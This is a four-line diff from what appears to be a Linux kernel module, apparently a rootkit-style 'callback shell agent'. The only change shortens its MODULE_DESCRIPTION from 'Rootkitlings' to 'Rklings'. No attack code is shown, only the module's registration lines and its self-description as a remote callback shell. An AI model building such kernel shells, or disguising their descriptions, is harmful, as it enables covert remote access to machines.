@@ -55,4 +55,4 @@ module_init(rk_init);
 module_exit(rk_exit);
 
 MODULE_LICENSE("GPL");
-MODULE_DESCRIPTION("Rootkitlings callback shell agent");
+MODULE_DESCRIPTION("Rklings callback shell agent");
